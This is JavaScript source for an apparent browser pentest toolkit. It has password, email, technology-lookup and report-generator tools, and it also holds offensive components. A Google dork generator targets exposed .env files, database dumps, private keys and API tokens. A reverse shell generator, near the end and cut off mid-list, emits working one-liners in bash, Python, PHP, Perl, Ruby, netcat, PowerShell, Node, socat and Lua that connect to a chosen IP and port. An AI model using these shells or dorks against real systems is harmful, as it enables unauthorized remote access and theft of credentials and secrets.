            const useSymbols = document.getElementById('password-generator-symbols').checked;
            const exclude = document.getElementById('password-generator-exclude').checked;
            const qty = Math.min(50, parseInt(document.getElementById('password-generator-qty').value) || 5);

            let charset = '';
            if (useUpper) charset += exclude ? 'ABCDEFGHJKLMNPQRSTUVWXYZ' : 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
            if (useLower) charset += exclude ? 'abcdefghjkmnpqrstuvwxyz' : 'abcdefghijklmnopqrstuvwxyz';
            if (useNumbers) charset += exclude ? '23456789' : '0123456789';
            if (useSymbols) charset += '!@#$%^&*()_+-=[]{}|;:,.<>?';
            if (!charset) { SecAssem.showToast('Select at least one character type', 'warning'); return; }

            const entropy = Math.floor(length * Math.log2(charset.length));
            const passwords = [];
            for (let i = 0; i < qty; i++) {
                const arr = new Uint32Array(length);
                crypto.getRandomValues(arr);
                let pass = '';
                for (let j = 0; j < length; j++) pass += charset[arr[j] % charset.length];
                passwords.push(pass);
            }

            let html = `<div class="result-header"><h4>Generated Passwords</h4>
                <span class="badge severity-info">Entropy: ~${entropy} bits</span></div>`;
            html += '<div class="payload-list">';
            passwords.forEach((p, i) => {
                const strength = entropy >= 80 ? 'severity-low' : entropy >= 60 ? 'severity-medium' : 'severity-high';
                html += `<div class="payload-item"><code>${SecAssem.escapeHtml(p)}</code>
                    <span class="badge ${strength}">${entropy}b</span>
                    <button class="copy-btn" onclick="SecAssem.copyToClipboard(decodeURIComponent('${encodeURIComponent(p)}'))">📋</button></div>`;
            });
            html += '</div>';
            document.getElementById('password-generator-results').innerHTML = html;
            SecAssem.showToast(`Generated ${qty} passwords`, 'success');
        },

        /* ===== Password Strength Analyzer ===== */
        passwordAnalyzer() {
            const pass = document.getElementById('password-analyzer-pass').value;
            if (!pass) { SecAssem.showToast('Please enter a password', 'warning'); return; }

            let charsetSize = 0;
            if (/[a-z]/.test(pass)) charsetSize += 26;
            if (/[A-Z]/.test(pass)) charsetSize += 26;
            if (/[0-9]/.test(pass)) charsetSize += 10;
            if (/[^a-zA-Z0-9]/.test(pass)) charsetSize += 33;

            const entropy = Math.floor(pass.length * Math.log2(charsetSize || 1));
            const issues = [];
            if (pass.length < 8) issues.push('Too short (min 8 characters)');
            if (!/[A-Z]/.test(pass)) issues.push('Add uppercase letters');
            if (!/[a-z]/.test(pass)) issues.push('Add lowercase letters');
            if (!/[0-9]/.test(pass)) issues.push('Add numbers');
            if (!/[^a-zA-Z0-9]/.test(pass)) issues.push('Add special characters');
            if (/(.)\1{2,}/.test(pass)) issues.push('Contains repeated characters');
            if (/^(123|abc|qwerty|password|admin|letmein|welcome)/i.test(pass)) issues.push('Starts with common pattern');
            if (/^[a-zA-Z]+$/.test(pass)) issues.push('Only letters — add variety');
            if (/^[0-9]+$/.test(pass)) issues.push('Only numbers — add variety');
            if (/(012|123|234|345|456|567|678|789)/.test(pass)) issues.push('Contains sequential numbers');
            if (/(abc|bcd|cde|def|efg|fgh|ghi)/i.test(pass)) issues.push('Contains sequential letters');
            if (/(qwerty|asdf|zxcv)/i.test(pass)) issues.push('Contains keyboard pattern');

            let score = Math.min(100, Math.floor(entropy * 1.2));
            score -= issues.length * 8;
            score = Math.max(0, Math.min(100, score));

            const label = score >= 80 ? 'Strong' : score >= 60 ? 'Moderate' : score >= 40 ? 'Weak' : 'Very Weak';
            const barClass = score >= 80 ? 'severity-low' : score >= 60 ? 'severity-medium' : score >= 40 ? 'severity-high' : 'severity-critical';

            // Crack time estimation
            const guessesPerSec = { online_throttled: 100, online: 10000, offline_slow: 1e7, offline_fast: 1e10 };
            const combinations = Math.pow(charsetSize || 1, pass.length);
            const formatTime = (seconds) => {
                if (seconds < 1) return 'Instant';
                if (seconds < 60) return Math.floor(seconds) + ' seconds';
                if (seconds < 3600) return Math.floor(seconds / 60) + ' minutes';
                if (seconds < 86400) return Math.floor(seconds / 3600) + ' hours';
                if (seconds < 31536000) return Math.floor(seconds / 86400) + ' days';
                if (seconds < 31536000 * 1000) return Math.floor(seconds / 31536000) + ' years';
                if (seconds < 31536000 * 1e6) return Math.floor(seconds / 31536000e3) + 'K years';
                if (seconds < 31536000 * 1e9) return Math.floor(seconds / 31536000e6) + 'M years';
                return '∞';
            };

            let html = `<div class="result-header"><h4>Password Analysis</h4></div>
                <div class="strength-meter"><div class="strength-bar ${barClass}" style="width:${score}%"></div></div>
                <div class="strength-label"><strong>${label}</strong> — Score: ${score}/100 — Entropy: ${entropy} bits</div>
                <h4>Crack Time Estimates</h4>
                <table class="data-table"><thead><tr><th>Attack Type</th><th>Speed</th><th>Estimated Time</th></tr></thead><tbody>
                    <tr><td>Online (throttled)</td><td>100/sec</td><td>${formatTime(combinations / 2 / guessesPerSec.online_throttled)}</td></tr>
                    <tr><td>Online (unthrottled)</td><td>10K/sec</td><td>${formatTime(combinations / 2 / guessesPerSec.online)}</td></tr>
                    <tr><td>Offline (slow hash)</td><td>10M/sec</td><td>${formatTime(combinations / 2 / guessesPerSec.offline_slow)}</td></tr>
                    <tr><td>Offline (fast hash)</td><td>10B/sec</td><td>${formatTime(combinations / 2 / guessesPerSec.offline_fast)}</td></tr>
                </tbody></table>
                <h4>Breakdown</h4>
                <div class="password-breakdown">
                    <p>Length: <strong>${pass.length}</strong> | Charset Size: <strong>${charsetSize}</strong></p>
                    <p>Uppercase: ${/[A-Z]/.test(pass) ? '✓' : '✗'} | Lowercase: ${/[a-z]/.test(pass) ? '✓' : '✗'} | Numbers: ${/[0-9]/.test(pass) ? '✓' : '✗'} | Symbols: ${/[^a-zA-Z0-9]/.test(pass) ? '✓' : '✗'}</p>
                </div>`;
            if (issues.length) {
                html += '<h4>Suggestions</h4><ul class="issue-list">';
                issues.forEach(i => html += `<li>⚠ ${i}</li>`);
                html += '</ul>';
            }
            document.getElementById('password-analyzer-results').innerHTML = html;
        },

        /* ===== Google Dork Generator ===== */
        dorkGenerator() {
            const domain = document.getElementById('dork-generator-domain').value.trim();
            const category = document.getElementById('dork-generator-category').value;
            const keyword = document.getElementById('dork-generator-keyword').value.trim();
            if (!domain) { SecAssem.showToast('Please enter a domain', 'warning'); return; }

            const siteOp = `site:${domain}`;
            const dorks = {
                sensitive: [
                    `${siteOp} filetype:pdf`, `${siteOp} filetype:doc OR filetype:docx`, `${siteOp} filetype:xls OR filetype:xlsx`,
                    `${siteOp} filetype:txt "password"`, `${siteOp} filetype:log`, `${siteOp} filetype:bak`,
                    `${siteOp} filetype:sql`, `${siteOp} filetype:env`, `${siteOp} filetype:cfg`,
                    `${siteOp} filetype:key OR filetype:pem`, `${siteOp} ext:xml | ext:json "password"`,
                    `${siteOp} filetype:csv "email"`, `${siteOp} intitle:"index of" "backup"`,
                    `${siteOp} "confidential" OR "internal use only"`, `${siteOp} filetype:old OR filetype:bkp`,
                ],
                login: [
                    `${siteOp} inurl:login`, `${siteOp} inurl:admin`, `${siteOp} inurl:signin`,
                    `${siteOp} intitle:"login"`, `${siteOp} intitle:"admin panel"`, `${siteOp} inurl:auth`,
                    `${siteOp} inurl:dashboard`, `${siteOp} inurl:portal`, `${siteOp} inurl:wp-admin`,
                    `${siteOp} inurl:cpanel`, `${siteOp} inurl:webmail`, `${siteOp} inurl:phpmyadmin`,
                    `${siteOp} intitle:"sign in"`, `${siteOp} inurl:sso`, `${siteOp} inurl:oauth`,
                ],
                directories: [
                    `${siteOp} intitle:"index of /"`, `${siteOp} intitle:"index of" "parent directory"`,
                    `${siteOp} intitle:"index of" "backup"`, `${siteOp} intitle:"index of" "config"`,
                    `${siteOp} intitle:"index of" "database"`, `${siteOp} intitle:"index of" ".git"`,
                    `${siteOp} intitle:"index of" "wp-content"`, `${siteOp} intitle:"index of" "uploads"`,
                    `${siteOp} intitle:"index of" "private"`, `${siteOp} intitle:"index of" "secret"`,
                ],
                database: [
                    `${siteOp} filetype:sql "insert into"`, `${siteOp} filetype:sql "CREATE TABLE"`,
                    `${siteOp} filetype:mdb`, `${siteOp} filetype:sqlite OR filetype:db`,
                    `${siteOp} filetype:sql "password"`, `${siteOp} ext:sql intext:username`,
                    `${siteOp} "phpMyAdmin" OR "phpPgAdmin"`, `${siteOp} inurl:db OR inurl:database`,
                ],
                config: [
                    `${siteOp} filetype:env DB_PASSWORD`, `${siteOp} filetype:yml "password"`,
                    `${siteOp} filetype:ini "password"`, `${siteOp} filetype:conf "password"`,
                    `${siteOp} filetype:cfg`, `${siteOp} inurl:".env"`, `${siteOp} inurl:config.php`,
                    `${siteOp} inurl:wp-config.php`, `${siteOp} filetype:xml "password"`,
                    `${siteOp} "DB_HOST" "DB_PASSWORD"`, `${siteOp} filetype:properties "password"`,
                ],
                errors: [
                    `${siteOp} "SQL syntax" "error"`, `${siteOp} "Warning:" "mysql"`,
                    `${siteOp} "Fatal error" "on line"`, `${siteOp} "Parse error" "syntax error"`,
                    `${siteOp} "Uncaught exception"`, `${siteOp} intext:"stack trace"`,
                    `${siteOp} "ORA-" "error"`, `${siteOp} "Microsoft OLE DB Provider"`,
                    `${siteOp} "PostgreSQL" "ERROR"`, `${siteOp} intitle:"500 Internal Server Error"`,
                ],
                vulnerable: [
                    `${siteOp} inurl:"page=" OR inurl:"file=" OR inurl:"path="`,
                    `${siteOp} inurl:"id=" OR inurl:"item=" OR inurl:"cat="`,
                    `${siteOp} inurl:"redirect=" OR inurl:"url=" OR inurl:"next="`,
                    `${siteOp} inurl:".php?" "="`, `${siteOp} inurl:"download.php?file="`,
                    `${siteOp} inurl:"read.php?file="`, `${siteOp} inurl:"view.php?page="`,
                    `${siteOp} inurl:"include=" OR inurl:"inc="`, `${siteOp} inurl:"action=" OR inurl:"cmd="`,
                ],
                wordpress: [
                    `${siteOp} inurl:wp-content`, `${siteOp} inurl:wp-includes`, `${siteOp} inurl:wp-admin`,
                    `${siteOp} inurl:wp-json`, `${siteOp} filetype:txt inurl:wp-content`,
                    `${siteOp} inurl:xmlrpc.php`, `${siteOp} inurl:readme.html "wordpress"`,
                    `${siteOp} inurl:wp-login.php`, `${siteOp} inurl:wp-content/debug.log`,
                    `${siteOp} "powered by wordpress" inurl:wp-content/plugins/`,
                ],
                'api-keys': [
                    `${siteOp} "api_key" OR "apikey" OR "api-key"`, `${siteOp} "access_token"`,
                    `${siteOp} "secret_key" OR "secretkey"`, `${siteOp} "AKIA" filetype:env`,
                    `${siteOp} "Authorization: Bearer"`, `${siteOp} "client_secret"`,
                    `${siteOp} intext:"AIza" filetype:js`, `${siteOp} "ghp_" OR "gho_" OR "github_pat_"`,
                    `${siteOp} "sk_live_" OR "pk_live_"`, `${siteOp} "SG." "sendgrid"`,
                    `${siteOp} "PRIVATE KEY"`, `${siteOp} filetype:json "password" OR "secret"`,
                ],
            };

            let selected = dorks[category] || dorks.sensitive;
            if (keyword) {
                selected = selected.concat([`${siteOp} "${keyword}"`, `${siteOp} intext:"${keyword}"`, `${siteOp} intitle:"${keyword}"`]);
            }

            let html = `<div class="result-header"><h4>Google Dorks — ${category} (${selected.length})</h4>
                <button class="btn-secondary btn-sm" onclick="SecAssem.copyToClipboard('${selected.join('\\n').replace(/'/g, "\\'")}')">📋 Copy All</button></div>`;
            html += '<div class="payload-list">';
            selected.forEach(d => {
                const gUrl = `https://www.google.com/search?q=${encodeURIComponent(d)}`;
                html += `<div class="payload-item"><code>${SecAssem.escapeHtml(d)}</code>
                    <a href="${gUrl}" target="_blank" rel="noopener" class="dork-link">🔗</a>
                    <button class="copy-btn" onclick="SecAssem.copyToClipboard(decodeURIComponent('${encodeURIComponent(d)}'))">📋</button></div>`;
            });
            html += '</div>';
            document.getElementById('dork-generator-results').innerHTML = html;
            SecAssem.showToast(`Generated ${selected.length} Google dorks`, 'success');
        },

        /* ===== Email Validator ===== */
        async emailValidator() {
            const email = document.getElementById('email-validator-email').value.trim();
            if (!email) { SecAssem.showToast('Please enter an email', 'warning'); return; }
            SecAssem.showLoading('email-validator-results');

            const emailRegex = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
            const isValid = emailRegex.test(email);
            const domain = email.split('@')[1] || '';

            let mxHtml = '<p>Could not check MX records</p>';
            try {
                const r = await fetch(`https://dns.google/resolve?name=${encodeURIComponent(domain)}&type=MX`);
                const data = await r.json();
                if (data.Answer && data.Answer.length) {
                    mxHtml = '<table class="data-table"><thead><tr><th>Priority</th><th>Mail Server</th></tr></thead><tbody>';
                    data.Answer.forEach(a => {
                        const parts = a.data.split(' ');
                        mxHtml += `<tr><td>${parts[0]}</td><td><code>${SecAssem.escapeHtml(parts[1] || a.data)}</code></td></tr>`;
                    });
                    mxHtml += '</tbody></table>';
                } else { mxHtml = '<p class="no-results">No MX records found — domain may not accept email</p>'; }
            } catch (e) { /* keep default */ }

            document.getElementById('email-validator-results').innerHTML = `
                <div class="result-header"><h4>Email Validation</h4></div>
                <div class="geo-grid">
                    <div class="geo-card"><span class="geo-label">Email</span><span class="geo-value">${SecAssem.escapeHtml(email)}</span></div>
                    <div class="geo-card"><span class="geo-label">Format</span><span class="geo-value"><span class="badge ${isValid ? 'severity-low' : 'severity-critical'}">${isValid ? '✓ Valid' : '✗ Invalid'}</span></span></div>
                    <div class="geo-card"><span class="geo-label">Domain</span><span class="geo-value">${SecAssem.escapeHtml(domain)}</span></div>
                </div>
                <h4>MX Records</h4>${mxHtml}`;
        },

        /* ===== Technology Lookup ===== */
        async techLookup() {
            const url = document.getElementById('tech-lookup-url').value.trim();
            if (!url) { SecAssem.showToast('Please enter a URL', 'warning'); return; }
            SecAssem.showLoading('tech-lookup-results');
            try {
                const r = await fetch(`https://api.allorigins.win/raw?url=${encodeURIComponent(url)}`);
                const html = await r.text();
                const techs = [];
                const detect = (pattern, name, cat) => { if (pattern.test(html)) techs.push({ name, category: cat }); };

                // Frameworks & Libraries
                detect(/jquery[.-]?\d/i, 'jQuery', 'JavaScript Library');
                detect(/react/i, 'React', 'JavaScript Framework');
                detect(/angular/i, 'Angular', 'JavaScript Framework');
                detect(/vue\.js|vuejs/i, 'Vue.js', 'JavaScript Framework');
                detect(/next\.js|nextjs|_next\//i, 'Next.js', 'JavaScript Framework');
                detect(/nuxt/i, 'Nuxt.js', 'JavaScript Framework');
                detect(/svelte/i, 'Svelte', 'JavaScript Framework');
                detect(/ember/i, 'Ember.js', 'JavaScript Framework');
                detect(/backbone/i, 'Backbone.js', 'JavaScript Library');

                // CSS Frameworks
                detect(/bootstrap/i, 'Bootstrap', 'CSS Framework');
                detect(/tailwind/i, 'Tailwind CSS', 'CSS Framework');
                detect(/bulma/i, 'Bulma', 'CSS Framework');
                detect(/materialize/i, 'Materialize', 'CSS Framework');
                detect(/foundation/i, 'Foundation', 'CSS Framework');

                // CMS
                detect(/wp-content|wordpress/i, 'WordPress', 'CMS');
                detect(/drupal/i, 'Drupal', 'CMS');
                detect(/joomla/i, 'Joomla', 'CMS');
                detect(/shopify/i, 'Shopify', 'E-commerce');
                detect(/woocommerce/i, 'WooCommerce', 'E-commerce');
                detect(/magento/i, 'Magento', 'E-commerce');
                detect(/squarespace/i, 'Squarespace', 'CMS');
                detect(/wix\.com/i, 'Wix', 'CMS');

                // Analytics & Tools
                detect(/google-analytics|gtag|ga\.js|analytics\.js/i, 'Google Analytics', 'Analytics');
                detect(/googletagmanager/i, 'Google Tag Manager', 'Analytics');
                detect(/hotjar/i, 'Hotjar', 'Analytics');
                detect(/facebook.*pixel|fbevents/i, 'Facebook Pixel', 'Analytics');
                detect(/cloudflare/i, 'Cloudflare', 'CDN');
                detect(/recaptcha/i, 'reCAPTCHA', 'Security');
                detect(/hcaptcha/i, 'hCaptcha', 'Security');

                // Server
                detect(/nginx/i, 'Nginx', 'Web Server');
                detect(/apache/i, 'Apache', 'Web Server');
                detect(/php/i, 'PHP', 'Backend');
                detect(/asp\.net|__viewstate/i, 'ASP.NET', 'Backend');
                detect(/django/i, 'Django', 'Backend');
                detect(/laravel/i, 'Laravel', 'Backend');
                detect(/ruby on rails|rails/i, 'Ruby on Rails', 'Backend');

                // Meta generator
                const genMatch = html.match(/<meta[^>]+name=["']generator["'][^>]+content=["']([^"']+)["']/i);
                if (genMatch) techs.push({ name: genMatch[1], category: 'Generator' });

                let out = `<div class="result-header"><h4>Technologies Detected (${techs.length})</h4></div>`;
                if (techs.length) {
                    const groups = {};
                    techs.forEach(t => { (groups[t.category] = groups[t.category] || []).push(t.name); });
                    out += '<div class="tech-groups">';
                    Object.entries(groups).forEach(([cat, names]) => {
                        out += `<div class="tech-group"><h5>${cat}</h5><div class="tech-badges">`;
                        names.forEach(n => out += `<span class="badge severity-info">${SecAssem.escapeHtml(n)}</span>`);
                        out += '</div></div>';
                    });
                    out += '</div>';
                } else {
                    out += '<p class="no-results">No technologies detected. The site may use custom or obfuscated code.</p>';
                }
                document.getElementById('tech-lookup-results').innerHTML = out;
            } catch (e) {
                document.getElementById('tech-lookup-results').innerHTML = `<p class="no-results">Could not fetch the URL. CORS restrictions may apply.</p>`;
            }
        },

        /* ===== Report Generator ===== */
        addFinding() {
            SecAssem.findingCount++;
            const n = SecAssem.findingCount;
            const container = document.getElementById('report-generator-findings');
            const div = document.createElement('div');
            div.className = 'finding-card';
            div.id = `finding-${n}`;
            div.innerHTML = `
                <div class="finding-header">
                    <h4>Finding #${n}</h4>
                    <button class="btn-danger btn-sm" onclick="document.getElementById('finding-${n}').remove()">✗ Remove</button>
                </div>
                <div class="input-row"><div class="input-group" style="flex:2"><label>Title</label><input type="text" class="finding-title" placeholder="e.g. Stored XSS in Comments"></div>
                <div class="input-group" style="flex:1"><label>Severity</label><select class="finding-severity"><option value="Critical">Critical</option><option value="High">High</option><option value="Medium" selected>Medium</option><option value="Low">Low</option><option value="Info">Informational</option></select></div>
                <div class="input-group" style="flex:1"><label>CVSS Score</label><input type="number" class="finding-cvss" min="0" max="10" step="0.1" placeholder="7.5"></div></div>
                <div class="input-group"><label>Description</label><textarea class="finding-desc" rows="2" placeholder="Describe the vulnerability..."></textarea></div>
                <div class="input-group"><label>Impact</label><textarea class="finding-impact" rows="2" placeholder="What is the potential impact?"></textarea></div>
                <div class="input-group"><label>Affected Assets</label><textarea class="finding-assets" rows="1" placeholder="URLs, endpoints, IPs..."></textarea></div>
                <div class="input-group"><label>Steps to Reproduce</label><textarea class="finding-steps" rows="3" placeholder="1. Navigate to...&#10;2. Enter payload...&#10;3. Observe..."></textarea></div>
                <div class="input-group"><label>Remediation</label><textarea class="finding-remediation" rows="2" placeholder="Recommended fix..."></textarea></div>
                <div class="input-group"><label>References</label><textarea class="finding-refs" rows="1" placeholder="OWASP, CVE, CWE links..."></textarea></div>`;
            container.appendChild(div);
        },

        generateReport() {
            const client = document.getElementById('report-generator-client').value.trim() || 'Client';
            const project = document.getElementById('report-generator-project').value.trim() || 'Pentest';
            const tester = document.getElementById('report-generator-tester').value.trim() || 'Tester';
            const dateStart = document.getElementById('report-generator-date-start').value || 'N/A';
            const dateEnd = document.getElementById('report-generator-date-end').value || 'N/A';
            const scope = document.getElementById('report-generator-scope').value.trim() || 'N/A';
            const summary = document.getElementById('report-generator-summary').value.trim() || 'N/A';

            const findings = [];
            document.querySelectorAll('.finding-card').forEach(card => {
                findings.push({
                    title: card.querySelector('.finding-title')?.value || 'Untitled',
                    severity: card.querySelector('.finding-severity')?.value || 'Medium',
                    cvss: card.querySelector('.finding-cvss')?.value || 'N/A',
                    desc: card.querySelector('.finding-desc')?.value || '',
                    impact: card.querySelector('.finding-impact')?.value || '',
                    assets: card.querySelector('.finding-assets')?.value || '',
                    steps: card.querySelector('.finding-steps')?.value || '',
                    remediation: card.querySelector('.finding-remediation')?.value || '',
                    refs: card.querySelector('.finding-refs')?.value || '',
                });
            });

            const severityColors = { Critical: '#ef4444', High: '#f97316', Medium: '#eab308', Low: '#22c55e', Info: '#3b82f6' };
            const counts = { Critical: 0, High: 0, Medium: 0, Low: 0, Info: 0 };
            findings.forEach(f => { counts[f.severity] = (counts[f.severity] || 0) + 1; });

            const reportHtml = `<!DOCTYPE html>
<html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Pentest Report — ${client} — SEC ASSEM</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}body{font-family:'Segoe UI',system-ui,sans-serif;background:#0a0e17;color:#e2e8f0;padding:40px;line-height:1.7}
.container{max-width:900px;margin:0 auto}.header{text-align:center;padding:40px 0;border-bottom:2px solid #00d4aa}
.header h1{font-size:32px;color:#00d4aa;margin-bottom:8px}.header h2{font-size:20px;color:#94a3b8;font-weight:400}
.section{margin:32px 0;padding:24px;background:#111827;border-radius:12px;border:1px solid #1e293b}
.section h3{color:#00d4aa;font-size:20px;margin-bottom:16px;padding-bottom:8px;border-bottom:1px solid #1e293b}
table{width:100%;border-collapse:collapse;margin:12px 0}th,td{padding:10px 14px;text-align:left;border-bottom:1px solid #1e293b}
th{background:#1a2332;color:#94a3b8;font-weight:600}tr:hover{background:#1a233280}
.severity-badge{display:inline-block;padding:4px 12px;border-radius:20px;font-size:12px;font-weight:700;color:#fff}
.finding{margin:24px 0;padding:20px;background:#1a2332;border-radius:8px;border-left:4px solid #00d4aa}
.finding h4{font-size:18px;margin-bottom:12px}.finding-meta{display:flex;gap:16px;margin-bottom:12px}
.finding p{margin:8px 0;color:#94a3b8}.finding strong{color:#e2e8f0}
.bar-chart{display:flex;gap:8px;align-items:end;height:120px;margin:16px 0}
.bar{flex:1;display:flex;flex-direction:column;align-items:center;justify-content:flex-end}
.bar-fill{width:40px;border-radius:4px 4px 0 0;transition:height 0.3s}.bar-label{margin-top:8px;font-size:12px;color:#94a3b8}
.bar-count{font-size:14px;font-weight:700;margin-bottom:4px}
.footer{text-align:center;padding:32px 0;margin-top:32px;border-top:1px solid #1e293b;color:#64748b}
@media print{body{background:#fff;color:#000}.section{border:1px solid #ddd;background:#f9f9f9}.header h1{color:#0a6}
.finding{background:#f0f0f0;border-left-color:#0a6}th{background:#eee}tr:hover{background:transparent}}
</style></head><body><div class="container">
<div class="header"><h1>🛡️ SEC ASSEM</h1><h2>Penetration Test Report</h2></div>
<div class="section"><h3>Project Information</h3>
<table><tr><th>Client</th><td>${client}</td></tr><tr><th>Project</th><td>${project}</td></tr>
<tr><th>Tester</th><td>${tester}</td></tr><tr><th>Period</th><td>${dateStart} — ${dateEnd}</td></tr>
<tr><th>Report Date</th><td>${new Date().toISOString().split('T')[0]}</td></tr></table></div>
<div class="section"><h3>Scope</h3><p>${scope.replace(/\n/g, '<br>')}</p></div>
<div class="section"><h3>Executive Summary</h3><p>${summary.replace(/\n/g, '<br>')}</p>
<h4 style="margin-top:20px;color:#e2e8f0">Findings Overview</h4>
<div class="bar-chart">${Object.entries(counts).map(([sev, count]) =>
                `<div class="bar"><div class="bar-count">${count}</div><div class="bar-fill" style="height:${Math.max(count * 30, 4)}px;background:${severityColors[sev] || '#3b82f6'}"></div><div class="bar-label">${sev}</div></div>`
            ).join('')}</div>
<table><thead><tr><th>Severity</th><th>Count</th></tr></thead><tbody>${Object.entries(counts).map(([sev, count]) =>
                `<tr><td><span class="severity-badge" style="background:${severityColors[sev] || '#3b82f6'}">${sev}</span></td><td>${count}</td></tr>`
            ).join('')}<tr style="font-weight:700"><td>Total</td><td>${findings.length}</td></tr></tbody></table></div>
<div class="section"><h3>Detailed Findings</h3>
${findings.map((f, i) => `<div class="finding" style="border-left-color:${severityColors[f.severity] || '#3b82f6'}">
<h4>${i + 1}. ${f.title}</h4><div class="finding-meta"><span class="severity-badge" style="background:${severityColors[f.severity] || '#3b82f6'}">${f.severity}</span>
<span>CVSS: <strong>${f.cvss}</strong></span></div>
<p><strong>Description:</strong> ${f.desc.replace(/\n/g, '<br>')}</p>
<p><strong>Impact:</strong> ${f.impact.replace(/\n/g, '<br>')}</p>
<p><strong>Affected Assets:</strong> ${f.assets.replace(/\n/g, '<br>')}</p>
<p><strong>Steps to Reproduce:</strong><br>${f.steps.replace(/\n/g, '<br>')}</p>
<p><strong>Remediation:</strong> ${f.remediation.replace(/\n/g, '<br>')}</p>
${f.refs ? `<p><strong>References:</strong> ${f.refs.replace(/\n/g, '<br>')}</p>` : ''}
</div>`).join('')}</div>
<div class="footer"><p>Generated by <strong>SEC ASSEM</strong> — Cybersecurity Toolkit</p>
<p>This document is confidential. Unauthorized distribution is prohibited.</p></div>
</div></body></html>`;

            SecAssem.downloadFile(`Pentest_Report_${client.replace(/\s+/g, '_')}_${new Date().toISOString().split('T')[0]}.html`, reportHtml, 'text/html');
            SecAssem.showToast('Report downloaded successfully!', 'success');
            document.getElementById('report-generator-results').innerHTML = '<p class="result-success">✓ Report generated and downloaded.</p>';
        },

        previewReport() {
            SecAssem.showToast('Generating preview...', 'info');
            this.generateReport();
        },

        /* ===== Reverse Shell Generator ===== */
        revshellGenerator() {
            const ip = document.getElementById('revshell-generator-ip').value.trim();
            const port = document.getElementById('revshell-generator-port').value.trim();
            const type = document.getElementById('revshell-generator-type').value;
            if (!ip || !port) { SecAssem.showToast('Please enter IP and Port', 'warning'); return; }

            const shells = {
                bash: [
                    `bash -i >& /dev/tcp/${ip}/${port} 0>&1`,
                    `bash -c 'bash -i >& /dev/tcp/${ip}/${port} 0>&1'`,
                    `sh -i >& /dev/tcp/${ip}/${port} 0>&1`,
                    `/bin/bash -l > /dev/tcp/${ip}/${port} 0<&1 2>&1`,
                    `0<&196;exec 196<>/dev/tcp/${ip}/${port}; sh <&196 >&196 2>&196`,
                ],
                python: [
                    `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${ip}",${port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'`,
                    `python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("${ip}",${port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'`,
                ],
                php: [
                    `php -r '$sock=fsockopen("${ip}",${port});exec("/bin/sh -i <&3 >&3 2>&3");'`,
                    `php -r '$sock=fsockopen("${ip}",${port});$proc=proc_open("/bin/sh -i",array(0=>$sock,1=>$sock,2=>$sock),$pipes);'`,
                    `<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/${ip}/${port} 0>&1'"); ?>`,
                ],
                perl: [
                    `perl -e 'use Socket;$i="${ip}";$p=${port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`,
                    `perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"${ip}:${port}");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'`,
                ],
                ruby: [
                    `ruby -rsocket -e'f=TCPSocket.open("${ip}",${port}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'`,
                    `ruby -rsocket -e 'exit if fork;c=TCPSocket.new("${ip}","${port}");loop{c.gets.chomp!;(exit! if $_=="exit");($_=~/444444/444444 cd (.+)/)?Dir.chdir($1):IO.popen($_,?r){|io|c.print io.read}}'`,
                ],
                netcat: [
                    `nc -e /bin/sh ${ip} ${port}`,
                    `nc -e /bin/bash ${ip} ${port}`,
                    `nc -c bash ${ip} ${port}`,
                    `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${ip} ${port} >/tmp/f`,
                    `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc ${ip} ${port} >/tmp/f`,
                ],
                powershell: [
                    `powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("${ip}",${port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()`,
                    `powershell -e ${btoa(`$client = New-Object System.Net.Sockets.TCPClient('${ip}',${port})`).substring(0, 30)}...`,
                ],
                java: [
                    `java -jar shell.jar (create Runtime.exec reverse shell)`,
                    `r = Runtime.getRuntime()\np = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/${ip}/${port};cat <&5 | while read line; do \\$line 2>&5 >&5; done"] as String[])\np.waitFor()`,
                ],
                nodejs: [
                    `node -e '(function(){var net = require("net"),cp = require("child_process"),sh = cp.spawn("/bin/sh", []);var client = new net.Socket();client.connect(${port}, "${ip}", function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});return /a/;})()'`,
                    `require('child_process').exec('bash -i >& /dev/tcp/${ip}/${port} 0>&1')`,
                ],
                socat: [
                    `socat TCP4:${ip}:${port} EXEC:bash`,
                    `socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:${ip}:${port}`,
                ],
                lua: [
                    `lua -e "require('socket');require('os');t=socket.tcp();t:connect('${ip}','${port}');os.execute('/bin/sh -i <&3 >&3 2>&3');"`,
                    `lua5.1 -e 'local host, port = "${ip}", ${port} local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, "r") local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'`,
                ],
                awk: [
